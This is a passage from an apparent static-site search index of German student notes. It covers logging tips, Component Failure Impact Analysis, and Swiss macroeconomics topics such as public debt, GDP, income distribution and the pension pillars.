            "text": "Easy to use, wiederverwendbar  Zentralisiert, damit der Administrator es an einem Ort einsehen kann  Nur wenig Performance-Einbussen auf die Applikation  Filterung nach Konfiguration f\u00fcr verschiedene Typen", 
            "title": "Herausforderungen"
        }, 
        {
            "location": "/Vss/8_Vss_Management/#tipps", 
            "text": "Logging Framework benutzen (z.B.  log4j )  Mehrere Log levels ( debug ,  info ,  warning ,  severe )  slf4j  als Wrapper benutzen, damit das konkrete Logging-Framework abstrahiert wird und sp\u00e4ter ge\u00e4ndert werden kann  In Logs \"W\"-Fragen beantworten: Wo ist was, wie, wann und von wem passiert? etc.", 
            "title": "Tipps"
        }, 
        {
            "location": "/Vss/9_CFIA/", 
            "text": "Component Failure Impact Analysis (CFIA)\n\n\nZiele\n\n\n\n\nThe purpose of a CFIA is to provide information to ensure that the availability and recovery design criteria for new or existing IT services are influenced to prevent or minimize the impact of failure to the business operation and users\n\n\n\n\n\n\nRisiko-Analyse, um abzusch\u00e4tzen, wie Ausf\u00e4lle Einfluss auf die IT-Services haben k\u00f6nnen\n\n\nImpact bei Ausfall von Komponenten auf die Business Operations verhindern oder minimieren\n\n\nZeit f\u00fcrs Entdecken und Beheben von Ausf\u00e4llen minimieren\n\n\n\n\nCFIA Matrix\n\n\n\n\nIn vertikaler Spalte alle \"Configuration Items\" auflisten\n\n\nDas sind Komponenten, Nodes, Applications, Links, etc.\n\n\nKann Hardware sein, aber auch das OS, ein bestimmter Prozess, Datenbanken, etc.\n\n\n\n\n\n\nIn horizontaler Richtung die kritischen IT-Services auflisten\n\n\nF\u00fcr jede Zelle ausf\u00fcllen:\n\n\nLeer lassen, wenn Ausfall des CI keine Auswirkung auf Service hat\n\n\nX\n, wenn bei Ausfall des CI der Service nicht verf\u00fcgbar ist\n\n\nA\n, wenn eine alternative CI automatisch \u00fcbernehmen kann (z.B. Redundante Server)\n\n\nM\n, wenn eine alternative CI existiert, aber von Hand eingegriffen werden muss\n\n\n\n\n\n\nKritisch sind Komponenten mit vielen \nX\n, da ein Ausfall ein hoher Impact hat\n\n\nKritisch sind auch Services mit vielen \nX\n, da sie komplex und Fehler-anf\u00e4llig sind\n\n\n\n\nErweiterung\n\n\n\n\nF\u00fcr jede Komponente beschreiben\n\n\nWie kann sie ausfallen?\n\n\nWie kann ein Ausfall entdeckt werden?\n\n\nWas sind Recovery Procedures?\n\n\n\n\n\n\nSind die Prozesse dokumentiert? K\u00f6nnen sie verbessert werden?", 
            "title": "9 CFIA"
        }, 
        {
            "location": "/Vss/9_CFIA/#component-failure-impact-analysis-cfia", 
            "text": "", 
            "title": "Component Failure Impact Analysis (CFIA)"
        }, 
        {
            "location": "/Vss/9_CFIA/#ziele", 
            "text": "The purpose of a CFIA is to provide information to ensure that the availability and recovery design criteria for new or existing IT services are influenced to prevent or minimize the impact of failure to the business operation and users    Risiko-Analyse, um abzusch\u00e4tzen, wie Ausf\u00e4lle Einfluss auf die IT-Services haben k\u00f6nnen  Impact bei Ausfall von Komponenten auf die Business Operations verhindern oder minimieren  Zeit f\u00fcrs Entdecken und Beheben von Ausf\u00e4llen minimieren", 
            "title": "Ziele"
        }, 
        {
            "location": "/Vss/9_CFIA/#cfia-matrix", 
            "text": "In vertikaler Spalte alle \"Configuration Items\" auflisten  Das sind Komponenten, Nodes, Applications, Links, etc.  Kann Hardware sein, aber auch das OS, ein bestimmter Prozess, Datenbanken, etc.    In horizontaler Richtung die kritischen IT-Services auflisten  F\u00fcr jede Zelle ausf\u00fcllen:  Leer lassen, wenn Ausfall des CI keine Auswirkung auf Service hat  X , wenn bei Ausfall des CI der Service nicht verf\u00fcgbar ist  A , wenn eine alternative CI automatisch \u00fcbernehmen kann (z.B. Redundante Server)  M , wenn eine alternative CI existiert, aber von Hand eingegriffen werden muss    Kritisch sind Komponenten mit vielen  X , da ein Ausfall ein hoher Impact hat  Kritisch sind auch Services mit vielen  X , da sie komplex und Fehler-anf\u00e4llig sind", 
            "title": "CFIA Matrix"
        }, 
        {
            "location": "/Vss/9_CFIA/#erweiterung", 
            "text": "F\u00fcr jede Komponente beschreiben  Wie kann sie ausfallen?  Wie kann ein Ausfall entdeckt werden?  Was sind Recovery Procedures?    Sind die Prozesse dokumentiert? K\u00f6nnen sie verbessert werden?", 
            "title": "Erweiterung"
        }, 
        {
            "location": "/Vwl/0_Index/", 
            "text": "Volkswirtschaft\n\n\n\n\nExam Notes\n\n\nWohlstand\n\n\nEinkommensverteilung und Sozialwerke\n\n\nWachstum\n\n\nArbeitsmarkt", 
            "title": "0 Index"
        }, 
        {
            "location": "/Vwl/0_Index/#volkswirtschaft", 
            "text": "Exam Notes  Wohlstand  Einkommensverteilung und Sozialwerke  Wachstum  Arbeitsmarkt", 
            "title": "Volkswirtschaft"
        }, 
        {
            "location": "/Vwl/10_Staatsfinanzen/", 
            "text": "Staatsfinanzen\n\n\nStaatsfinanzierung in der Schweiz\n\n\n\n\nIndirekte Steuern, vor allem MWSt\n\n\nDirekte Steuern\n\n\nEinkommen- und Verm\u00f6genssteuern von Haushalten und Unternehmen\n\n\nEinkommenssteuern Haushalte macht den gr\u00f6ssten Teil aus\n\n\n\n\n\n\nNB: Verm\u00f6genssteuern gibt es nicht in jedem Land, weil es eigentlich mehrfache Besteuerung ist\n\n\nDie reichsten 20% der Bev\u00f6lkerung zahlen ca. 80% der Steuern\n\n\n\n\n\n\n\n\nStaatsverschuldung\n\n\n\n\nVerschuldung im Inland:\n Staat bezieht im Inland Kredite -\n H\u00f6here Nachfrage, h\u00f6here Zinss\u00e4tze -\n Unternehmen investieren weniger\n\n\nVerschuldung im Ausland\n: Staat verkauft Staatsanleihen in eigener W\u00e4hrung -\n erh\u00f6hte Nachfrage nach eigener W\u00e4hrung, W\u00e4hrung wird st\u00e4rker -\n Problem f\u00fcr Exportindustrie\n\n\n\n\nVorteile\n\n\n\n\nStaatliche Investitionen f\u00fcr zuk\u00fcnftige Generationen, z.B. NEAT-Tunnel\n\n\nEin Teil wird als Schulden aufgenommen\n\n\nDadurch schiebt man die Finanzlast an zuk\u00fcnftige Generationen\n\n\n\n\n\n\n\n\nStaatsverschuldung in Europa\n\n\n\n\nTendenziell immer Anstieg von Staatsschulden\n\n\nVerschuldung ist politisch immer attraktiver\n\n\nAusgaben bringen mehr Stimmen\n\n\n\n\n\n\nGesamte L\u00e4nderverschuldung = Staatsschulden + Unternehmens- und Haushaltsschulden\n\n\nIrland hat h\u00f6chste Gesamtverschuldung, Griechenland ist da im Mittelfeld\n\n\n\n\n\n\n\n\nZukunftsschulden\n\n\n\n\nZ.B. Zahlungsversprechen an AHV, die in der Zukunft auftreten werden\n\n\nZusammen mit der expliziten Staatschuld ist das die \"Implizite Staatschuld\"\n\n\nIm Vergleich zur Staatsschuld ist die implizite Schuld in der Schweiz relativ hoch, im internationalen Vergleich etwa gleich wie DE\n\n\n\n\nStaatsverschuldung in der Schweiz\n\n\n\n\nNimmt seit 2003 ab\n\n\n2001 Schuldenbrems-Initiative (-\n Auf Verfassungsebene)\n\n\nSchulden d\u00fcrfen nur im Umfangs des BIPs steigen", 
            "title": "10 Staatsfinanzen"
        }, 
        {
            "location": "/Vwl/10_Staatsfinanzen/#staatsfinanzen", 
            "text": "", 
            "title": "Staatsfinanzen"
        }, 
        {
            "location": "/Vwl/10_Staatsfinanzen/#staatsfinanzierung-in-der-schweiz", 
            "text": "Indirekte Steuern, vor allem MWSt  Direkte Steuern  Einkommen- und Verm\u00f6genssteuern von Haushalten und Unternehmen  Einkommenssteuern Haushalte macht den gr\u00f6ssten Teil aus    NB: Verm\u00f6genssteuern gibt es nicht in jedem Land, weil es eigentlich mehrfache Besteuerung ist  Die reichsten 20% der Bev\u00f6lkerung zahlen ca. 80% der Steuern", 
            "title": "Staatsfinanzierung in der Schweiz"
        }, 
        {
            "location": "/Vwl/10_Staatsfinanzen/#staatsverschuldung", 
            "text": "Verschuldung im Inland:  Staat bezieht im Inland Kredite -  H\u00f6here Nachfrage, h\u00f6here Zinss\u00e4tze -  Unternehmen investieren weniger  Verschuldung im Ausland : Staat verkauft Staatsanleihen in eigener W\u00e4hrung -  erh\u00f6hte Nachfrage nach eigener W\u00e4hrung, W\u00e4hrung wird st\u00e4rker -  Problem f\u00fcr Exportindustrie", 
            "title": "Staatsverschuldung"
        }, 
        {
            "location": "/Vwl/10_Staatsfinanzen/#vorteile", 
            "text": "Staatliche Investitionen f\u00fcr zuk\u00fcnftige Generationen, z.B. NEAT-Tunnel  Ein Teil wird als Schulden aufgenommen  Dadurch schiebt man die Finanzlast an zuk\u00fcnftige Generationen", 
            "title": "Vorteile"
        }, 
        {
            "location": "/Vwl/10_Staatsfinanzen/#staatsverschuldung-in-europa", 
            "text": "Tendenziell immer Anstieg von Staatsschulden  Verschuldung ist politisch immer attraktiver  Ausgaben bringen mehr Stimmen    Gesamte L\u00e4nderverschuldung = Staatsschulden + Unternehmens- und Haushaltsschulden  Irland hat h\u00f6chste Gesamtverschuldung, Griechenland ist da im Mittelfeld", 
            "title": "Staatsverschuldung in Europa"
        }, 
        {
            "location": "/Vwl/10_Staatsfinanzen/#zukunftsschulden", 
            "text": "Z.B. Zahlungsversprechen an AHV, die in der Zukunft auftreten werden  Zusammen mit der expliziten Staatschuld ist das die \"Implizite Staatschuld\"  Im Vergleich zur Staatsschuld ist die implizite Schuld in der Schweiz relativ hoch, im internationalen Vergleich etwa gleich wie DE", 
            "title": "Zukunftsschulden"
        }, 
        {
            "location": "/Vwl/10_Staatsfinanzen/#staatsverschuldung-in-der-schweiz", 
            "text": "Nimmt seit 2003 ab  2001 Schuldenbrems-Initiative (-  Auf Verfassungsebene)  Schulden d\u00fcrfen nur im Umfangs des BIPs steigen", 
            "title": "Staatsverschuldung in der Schweiz"
        }, 
        {
            "location": "/Vwl/1_Exam/", 
            "text": "Some exam notes...", 
            "title": "1 Exam"
        }, 
        {
            "location": "/Vwl/2_Wohlstand/", 
            "text": "Wohlstand / Makro\u00f6konomisches Gleichgewicht\n\n\n\n\nMikro\u00f6konimie untersucht das Verhalten einzelner M\u00e4rkte und Branchen, Makro\u00f6konomie auf Stufe von mehreren L\u00e4ndern\n\n\n\n\nPreisniveau\n\n\n\n\nPreisniveau: Je h\u00f6her, desto h\u00f6her werden die Preise\n\n\nWird mit einem standardisierten G\u00fctekorb gemessen\n\n\nVerschiedene G\u00fctekorbe, z.B. f\u00fcr Konsumenten oder Produzenten\n\n\n\n\n\n\nProduzentenpreisindex in den letzten Jahren stark gesunken\n\n\nStarker Franken (zuerst 1.20, jetzt ca. 1.08)\n\n\nRohstoffe sind g\u00fcnstiger geworden (geringere Nachfrage)\n\n\n\n\n\n\nDagegen ist konsumentenindex nur leicht gesunken\n\n\nKonsumenteng\u00fcterkorb ist auf Luxuskonsum ausgerichtet\n\n\nWenig f\u00fcr Bildung, viel f\u00fcr Restaurant / Hotels\n\n\n\n\n\n\nF\u00fcr SNB ist sinkende Konsumentenindex gef\u00e4hrlich\n\n\nKonsumenten sparen mehr -\n Deflation\n\n\nProblem in Japan seit 20 Jahren (stark verschuldet)\n\n\n\n\n\n\nFolie 11: Schweizer Volk kann Inflation sehr gut einsch\u00e4tzen\n\n\n\n\nReales BIP\n\n\n\n\nBIP: Alle G\u00fcter und Dienstleistungen, die in einem Jahr in einem Land hergestellt werden\n\n\nReales BIP: Nominales BIP - Inflation\n\n\nheisst: Alles zu festgelegten Standardpreisen\n\n\n\n\n\n\nHier immer das reale BIP gemeint!\n\n\n2009 Finanzkriese: Platzen der Immobilienblase in den USA + Eurokrise (unabh\u00e4ngig)\n\n\n2015: BIP pro Kopf gesunken, weil starker Zuwanderung von Arbeitskr\u00e4ften\n\n\nEinwanderer gehen in Branchen, die weniger Wertsch\u00f6pfung haben, z.B. Gesundheitsbereich, Pflege, etc.\n\n\n\n\n\n\n\n\nAN-Kurve (Aggregierte Nachfrage)\n\n\n\n\nNachfrage nach G\u00fctern von Konsumenten, Unternehmen, Staat, Import/Export\n\n\nUSA hat negative Nettoexperte (mehr Importe als Exporte)\n\n\nJe tiefer das Preisniveau, desto h\u00f6her die Nachfrage\n\n\n\n\nAAL-Konstante (langfristig aggregiertes Angebot)\n\n\n\n\nDer Punkt, an dem ein Land mit allen verf\u00fcgbaren Ressourcen produzieren\n\n\nheisst: Jeder arbeitet, alle Maschinen laufen, etc.\n\n\n\"Optimale Produktionsmenge\"\n\n\nIst bei uns konstante Gr\u00f6sse\n\n\n\n\nAAk-Kurve (kurzfristig aggregiertes Angebot)\n\n\n\n\nJe h\u00f6her die Preise, desto mehr wollen die Produzenten herstellen\n\n\nKann theoretisch \u00fcber Kapazit\u00e4tsgrenze, dann arbeiten Menschen \u00fcberstunden\n\n\n\"\u00fcberhitzte\" Wirtschaft\n\n\nF\u00fchrt zu explodierenden Preisen\n\n\n\n\n\n\n\n\nProduktion links der Kapazit\u00e4tsgrenze -\n Rezession\n\n\n\n\n\n\nIdealerweise kreuzen sich AN und AAK genau auf Kapazit\u00e4tsgrenze\n\n\n\n\nOptimale Auslastung und genau soviel, wie die Nachfrage verlangt\n\n\nIn der Schweiz ist der Punkt eher rechts der Grenze, weil z.T. viele Arbeitskr\u00e4fte fehlen\n\n\nAndere Darstellung: Angebot eines Landes ist gleich der Nachfrage\n\n\n\n\nReales BIP in der Schweiz\n\n\n\n\nIn Produktionswert sind die Werte mehrmals verrechnet, wenn z.B. ein F\u00f6rster sein Holz verkauft und die S\u00e4gerei das Holz dem Schreiner, ist das Holz zwei Mal verrechnet\n\n\nVorleistungen rechnen dies raus - etwa die H\u00e4lfte in der Schweiz\n\n\nRund 2/3 des BIP geht an Arbeitnehmer, 1/6 an Arbeitgeber\n\n\nIn der Schweiz ist dieser Wert ziemlich konstant, im Gegensatz z.B. zu USA und Schweden\n\n\nGrund: GAVs, Arbeitsfrieden, (direkte Demokratie)\n\n\n\n\n\n\nExporte in der Schweiz in den letzten Jahren gesunken, aber auch Importe sind gefallen -\n BIP bleibt gleich\n\n\nGold- Import und Export ist gleich gross (70 Mia.)\n\n\nSchweiz ist Handelsplatz f\u00fcr Gold\n\n\n\n\n\n\nKaufkraftbereinigung: BIP bereinigt nach Kaufkraft, d.h. was kann man mit dem BIP kaufen?\n\n\n1975 war die Schweiz das reichste Land der Welt, danach weniger Wachstum\n\n\nAbschottung, Binnenmarkt geschlossen\n\n\nPreis von direkter Demokratie, F\u00f6deralismus, ...\n\n\n\n\n\n\nStarke Korrelation zwischen BIP pro Kopf und sozialem Fortschritt\n\n\nHoher Wohlstand ist wichtig bis zu einem gewissen Grad (dann immer weniger Fortschritt)", 
            "title": "2 Wohlstand"
        }, 
        {
            "location": "/Vwl/2_Wohlstand/#wohlstand-makrookonomisches-gleichgewicht", 
            "text": "Mikro\u00f6konimie untersucht das Verhalten einzelner M\u00e4rkte und Branchen, Makro\u00f6konomie auf Stufe von mehreren L\u00e4ndern", 
            "title": "Wohlstand / Makro\u00f6konomisches Gleichgewicht"
        }, 
        {
            "location": "/Vwl/2_Wohlstand/#preisniveau", 
            "text": "Preisniveau: Je h\u00f6her, desto h\u00f6her werden die Preise  Wird mit einem standardisierten G\u00fctekorb gemessen  Verschiedene G\u00fctekorbe, z.B. f\u00fcr Konsumenten oder Produzenten    Produzentenpreisindex in den letzten Jahren stark gesunken  Starker Franken (zuerst 1.20, jetzt ca. 1.08)  Rohstoffe sind g\u00fcnstiger geworden (geringere Nachfrage)    Dagegen ist konsumentenindex nur leicht gesunken  Konsumenteng\u00fcterkorb ist auf Luxuskonsum ausgerichtet  Wenig f\u00fcr Bildung, viel f\u00fcr Restaurant / Hotels    F\u00fcr SNB ist sinkende Konsumentenindex gef\u00e4hrlich  Konsumenten sparen mehr -  Deflation  Problem in Japan seit 20 Jahren (stark verschuldet)    Folie 11: Schweizer Volk kann Inflation sehr gut einsch\u00e4tzen", 
            "title": "Preisniveau"
        }, 
        {
            "location": "/Vwl/2_Wohlstand/#reales-bip", 
            "text": "BIP: Alle G\u00fcter und Dienstleistungen, die in einem Jahr in einem Land hergestellt werden  Reales BIP: Nominales BIP - Inflation  heisst: Alles zu festgelegten Standardpreisen    Hier immer das reale BIP gemeint!  2009 Finanzkriese: Platzen der Immobilienblase in den USA + Eurokrise (unabh\u00e4ngig)  2015: BIP pro Kopf gesunken, weil starker Zuwanderung von Arbeitskr\u00e4ften  Einwanderer gehen in Branchen, die weniger Wertsch\u00f6pfung haben, z.B. Gesundheitsbereich, Pflege, etc.", 
            "title": "Reales BIP"
        }, 
        {
            "location": "/Vwl/2_Wohlstand/#an-kurve-aggregierte-nachfrage", 
            "text": "Nachfrage nach G\u00fctern von Konsumenten, Unternehmen, Staat, Import/Export  USA hat negative Nettoexperte (mehr Importe als Exporte)  Je tiefer das Preisniveau, desto h\u00f6her die Nachfrage", 
            "title": "AN-Kurve (Aggregierte Nachfrage)"
        }, 
        {
            "location": "/Vwl/2_Wohlstand/#aal-konstante-langfristig-aggregiertes-angebot", 
            "text": "Der Punkt, an dem ein Land mit allen verf\u00fcgbaren Ressourcen produzieren  heisst: Jeder arbeitet, alle Maschinen laufen, etc.  \"Optimale Produktionsmenge\"  Ist bei uns konstante Gr\u00f6sse", 
            "title": "AAL-Konstante (langfristig aggregiertes Angebot)"
        }, 
        {
            "location": "/Vwl/2_Wohlstand/#aak-kurve-kurzfristig-aggregiertes-angebot", 
            "text": "Je h\u00f6her die Preise, desto mehr wollen die Produzenten herstellen  Kann theoretisch \u00fcber Kapazit\u00e4tsgrenze, dann arbeiten Menschen \u00fcberstunden  \"\u00fcberhitzte\" Wirtschaft  F\u00fchrt zu explodierenden Preisen     Produktion links der Kapazit\u00e4tsgrenze -  Rezession    Idealerweise kreuzen sich AN und AAK genau auf Kapazit\u00e4tsgrenze   Optimale Auslastung und genau soviel, wie die Nachfrage verlangt  In der Schweiz ist der Punkt eher rechts der Grenze, weil z.T. viele Arbeitskr\u00e4fte fehlen  Andere Darstellung: Angebot eines Landes ist gleich der Nachfrage", 
            "title": "AAk-Kurve (kurzfristig aggregiertes Angebot)"
        }, 
        {
            "location": "/Vwl/2_Wohlstand/#reales-bip-in-der-schweiz", 
            "text": "In Produktionswert sind die Werte mehrmals verrechnet, wenn z.B. ein F\u00f6rster sein Holz verkauft und die S\u00e4gerei das Holz dem Schreiner, ist das Holz zwei Mal verrechnet  Vorleistungen rechnen dies raus - etwa die H\u00e4lfte in der Schweiz  Rund 2/3 des BIP geht an Arbeitnehmer, 1/6 an Arbeitgeber  In der Schweiz ist dieser Wert ziemlich konstant, im Gegensatz z.B. zu USA und Schweden  Grund: GAVs, Arbeitsfrieden, (direkte Demokratie)    Exporte in der Schweiz in den letzten Jahren gesunken, aber auch Importe sind gefallen -  BIP bleibt gleich  Gold- Import und Export ist gleich gross (70 Mia.)  Schweiz ist Handelsplatz f\u00fcr Gold    Kaufkraftbereinigung: BIP bereinigt nach Kaufkraft, d.h. was kann man mit dem BIP kaufen?  1975 war die Schweiz das reichste Land der Welt, danach weniger Wachstum  Abschottung, Binnenmarkt geschlossen  Preis von direkter Demokratie, F\u00f6deralismus, ...    Starke Korrelation zwischen BIP pro Kopf und sozialem Fortschritt  Hoher Wohlstand ist wichtig bis zu einem gewissen Grad (dann immer weniger Fortschritt)", 
            "title": "Reales BIP in der Schweiz"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/", 
            "text": "Einkommensverteilung \n Sozialwerke\n\n\n\n\nProblem bei BIP pro Kopf: Es gibt kein \"Durschnitts-Kopf\"\n\n\n\n\nEffizienz und Veteilung\n\n\n\n\nEffizienz: Situation eines einzelnen Verbessern, ohne andere schlechter zu stellen\n\n\nauch z.b.: Reiche werden reicher, alle anderen bleiben gleich\n\n\n\n\n\n\n\"M\u00f6glichst grossen Kuchen backen\" ohne R\u00fccksicht auf Verteilung\n\n\n\n\nVerteilungsgerechtigkeit\n\n\n\n\nVerteilung ist abh\u00e4ngig von Produktivit\u00e4t der Arbeitenden\n\n\nProduktivit\u00e4t = Wertsch\u00f6pfung / Stunde\n\n\nKassierer z.B. hat wenig Wertsch\u00f6pfung -\n weniger Produktivit\u00e4t\n\n\n\n\n\n\nWenn die Gesellschaft nicht damit einverstanden ist, muss umverteilt werden (z.B. wegen k\u00f6rperlicher / geistlicher Einschr\u00e4nkung)\n\n\n\n\nHerausforderungen\n\n\n\n\nWird zu viel umverteilt, gibt es weniger Anreize zu pers\u00f6nlicher Leistung\n\n\nWird zu wenig umverteilt, wird es als ungerecht empfunden\n\n\nDies braucht eine Balance der sozialpolitischen Instrumente\n\n\nGerecht / ungerecht != gleich / ungleiche Verteilung!\n\n\n\n\nGini-Koeffizient\n\n\n\n\nDiagonale w\u00e4re perfekte Gleichverteilung\n\n\nJe gr\u00f6sser der \"Bauch\", desto gr\u00f6sser die Ungleicher die Verteilung\n\n\nGini-Koeffizient: Anteil des Bauches mit der Fl\u00e4che unter der Diagonale\n\n\nJe h\u00f6her der Koeffizient, desto h\u00f6her die Ungleichheite Verteilung\n\n\n\n\n\n\nSagt nicht aus, wie hoch der Wohlstand ist\n\n\n\n\nGini-Koeffizient gibt es f\u00fcr Einkommen und Verm\u00f6gen\n\n\n\n\n\n\nChina und USA haben hohen Koeffizient, Schweiz etwas h\u00f6her als Deutschland / \u00d6sterreich\n\n\n\n\nS\u00fcdamerika hat hohe Ungleichverteilung\n\n\nUSA hat starke Leistungs-Philosphie -\n Ungleiche Verteilung ist \"amerikanisch\"\n\n\n\n\nVerm\u00f6gens-Verteilung\n\n\n\n\nStudie der SGB\n\n\nSchweiz hat angeblich einer der h\u00f6chsten Verm\u00f6gens-Gini-Koeffizienten\n\n\nHat nur Verm\u00f6gen der Steuerabrechnung eingerechnet\n\n\nHeisst: Ohne Pensionskasse, Immobilien (nur Eigenmietwert)\n\n\n\n\n\n\n\n\nArten der Umverteilung\n\n\n\n\nBei Umverteilung nimmt man immer jemandem etwas weg!\n\n\n\n\nEinkommensquellen (Lohn, Ertr\u00e4ge aus Verm\u00f6gen)\n\n\n\n\n\n\nUmverteilung ist in Schweiz relativ niedrig, aber ist auch weniger ungerecht verteilt im internationalen Vergleich\n\n\n\n\nSchweiz: Niedriger Lohn ca. 4000, guter Lohn ca. 10000, Faktor 2.5\n\n\n\n\n\n\n\n\nEs gibt viele Arbeitsstellen f\u00fcr Umverteilung in der Schweiz\n\n\n\n\n\n\nDie drei S\u00e4ulen der Schweizer Altersvorsorge\n\n\nAHV (1. S\u00e4ule)\n\n\n\n\nPflicht f\u00fcr ganze Bev\u00f6lkerung (mit Aufenthaltsbewilligung)\n\n\nZiel: Reine Existenzsicherung\n\n\n\n\nBerufliche Vorsorge (Pensionskasse)\n\n\n\n\nHaben alle mit Arbeitsstelle in der Schweiz (Pflicht)\n\n\n70%-80% des Lebensstandards in der Pension\n\n\nZwei Optionen: Einmalig ganzes Geld bekommen oder lebenslang einen Betrag (Rente) erhalten\n\n\nJunge zahlen weniger Prozente als \u00e4ltere\n\n\nBegr\u00fcndung: \"junge brauche das Geld noch\"\n\n\nEiner der Hauptgr\u00fcnde, dass \u00e4ltere nur schwieriger einen Job finden (Unternehmen muss mind. H\u00e4lfte \u00fcbernehmen)\n\n\n\n\n\n\n\n\nSelbstvorsoge\n\n\n\n\nKann vom steuerbaren Einkommen abgezogen werden\n\n\nPrivates Verm\u00f6gen \n freiwillig\n\n\n\n\nHerausforderungen f\u00fcr die erste und zweite S\u00e4ule\n\n\n\n\nHerausforderung: Leute w\u00e4ren immer \u00e4lter\n\n\nAHV geht von einer Pyramide aus: Mehr j\u00fcngere als \u00e4ltere\n\n\nGeburtenrate ist zu tief (1.6 statt 2.1), Durschnittliches Alter steigt\n\n\nAHV ist seit 2 Jahren im defizit\n\n\nWird momentan durch Fond (28 Mia.) finanziert\n\n\nIst aufgebraucht zwischen 2027 und 2033\n\n\n\n\nL\u00f6sungsm\u00f6glichkeiten\n\n\n\n\nDirekt einflussbare Parameter\n\n\nH\u00f6here Beitr\u00e4ge\n\n\nTiefere Renten (ausgeschlossen!1!!!)\n\n\nRentenalter erh\u00f6hen\n\n\n\n\n\n\n\n\nIndirekt beeinflussbar (keine L\u00f6sungen)\n\n\n\n\nImmigration\n\n\nGeburtenrate\n\n\nWirtschaftswachstum\n\n\n\n\n\n\n\n\nGesetzliches Rentenalter != durchschnittliches Rentenalter!\n\n\n\n\nz.B in Belgien, Frankreich ist effektives Rentenalter viel tiefer\n\n\nIn Portugal, Japan sehr hohes effektives Alter\n\n\nWeil wenig Altersvorsorge, keine Wahl\n\n\n\n\n\n\nIn der Schweiz \"arbeitet man gerne\"\n\n\nMan kann die Pension um 4 Jahre verz\u00f6gern f\u00fcr h\u00f6here Rente\n\n\n\n\n\n\n\n\nProbleme BVG (Pensionskasse)\n\n\n\n\nEs gibt einen Mindestzinssatz, die die Pensionskassen bieten m\u00fcssen\n\n\n2003: 4%, heute 1.75%\n\n\nHistorisch sind Pensionskassen unterdeckt, im letzten Jahr wieder h\u00f6her\n\n\nGewerkschaften wollen h\u00f6here Zinss\u00e4tze, Pensionskassen tiefere\n\n\nEin Drittel wird auf Obligationen investiert (Negativzinsen!)\n\n\nUmwandlungssatz: Prozentsatz des angesparten Verm\u00f6ges, der als rente ausbezahlt wird\n\n\n2005: 7.2% -\n Lebenserwartung von ~79\n\n\n2014: 6.8%\n\n\n2010: Referendum gegen 6.4% vom Schweizer Volk\n\n\n\n\n\n\n\n\nArmut in der Schweiz\n\n\n\n\nArmut nimmt in der Schweiz ab\n\n\n\"absolut arm\":\n\n\nDefiniert mit u.a. \"Kein Auto, kein Farbfernseher\"\n\n\nWenn drei von neun Kategorien erf\u00fcllt\n\n\n\n\n\n\n\n\nBedinungsloses Grundeinkommen\n\n\n\n\nTheoretisch 80-90% finanzierbar\n\n\nK\u00fcrzen von vielen Sozialleistungen, weil sie jetzt durch BGE gedeckt w\u00e4ren\n\n\nMehr als die H\u00e4lfte durch R\u00fcckzahlungen von Arbeitgeber", 
            "title": "3 Einkommensverteilung und Sozialwerke"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#einkommensverteilung-sozialwerke", 
            "text": "Problem bei BIP pro Kopf: Es gibt kein \"Durschnitts-Kopf\"", 
            "title": "Einkommensverteilung &amp; Sozialwerke"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#effizienz-und-veteilung", 
            "text": "Effizienz: Situation eines einzelnen Verbessern, ohne andere schlechter zu stellen  auch z.b.: Reiche werden reicher, alle anderen bleiben gleich    \"M\u00f6glichst grossen Kuchen backen\" ohne R\u00fccksicht auf Verteilung", 
            "title": "Effizienz und Veteilung"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#verteilungsgerechtigkeit", 
            "text": "Verteilung ist abh\u00e4ngig von Produktivit\u00e4t der Arbeitenden  Produktivit\u00e4t = Wertsch\u00f6pfung / Stunde  Kassierer z.B. hat wenig Wertsch\u00f6pfung -  weniger Produktivit\u00e4t    Wenn die Gesellschaft nicht damit einverstanden ist, muss umverteilt werden (z.B. wegen k\u00f6rperlicher / geistlicher Einschr\u00e4nkung)", 
            "title": "Verteilungsgerechtigkeit"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#herausforderungen", 
            "text": "Wird zu viel umverteilt, gibt es weniger Anreize zu pers\u00f6nlicher Leistung  Wird zu wenig umverteilt, wird es als ungerecht empfunden  Dies braucht eine Balance der sozialpolitischen Instrumente  Gerecht / ungerecht != gleich / ungleiche Verteilung!", 
            "title": "Herausforderungen"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#gini-koeffizient", 
            "text": "Diagonale w\u00e4re perfekte Gleichverteilung  Je gr\u00f6sser der \"Bauch\", desto gr\u00f6sser die Ungleicher die Verteilung  Gini-Koeffizient: Anteil des Bauches mit der Fl\u00e4che unter der Diagonale  Je h\u00f6her der Koeffizient, desto h\u00f6her die Ungleichheite Verteilung    Sagt nicht aus, wie hoch der Wohlstand ist   Gini-Koeffizient gibt es f\u00fcr Einkommen und Verm\u00f6gen    China und USA haben hohen Koeffizient, Schweiz etwas h\u00f6her als Deutschland / \u00d6sterreich   S\u00fcdamerika hat hohe Ungleichverteilung  USA hat starke Leistungs-Philosphie -  Ungleiche Verteilung ist \"amerikanisch\"", 
            "title": "Gini-Koeffizient"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#vermogens-verteilung", 
            "text": "Studie der SGB  Schweiz hat angeblich einer der h\u00f6chsten Verm\u00f6gens-Gini-Koeffizienten  Hat nur Verm\u00f6gen der Steuerabrechnung eingerechnet  Heisst: Ohne Pensionskasse, Immobilien (nur Eigenmietwert)", 
            "title": "Verm\u00f6gens-Verteilung"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#arten-der-umverteilung", 
            "text": "Bei Umverteilung nimmt man immer jemandem etwas weg!   Einkommensquellen (Lohn, Ertr\u00e4ge aus Verm\u00f6gen)    Umverteilung ist in Schweiz relativ niedrig, aber ist auch weniger ungerecht verteilt im internationalen Vergleich   Schweiz: Niedriger Lohn ca. 4000, guter Lohn ca. 10000, Faktor 2.5     Es gibt viele Arbeitsstellen f\u00fcr Umverteilung in der Schweiz", 
            "title": "Arten der Umverteilung"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#die-drei-saulen-der-schweizer-altersvorsorge", 
            "text": "", 
            "title": "Die drei S\u00e4ulen der Schweizer Altersvorsorge"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#ahv-1-saule", 
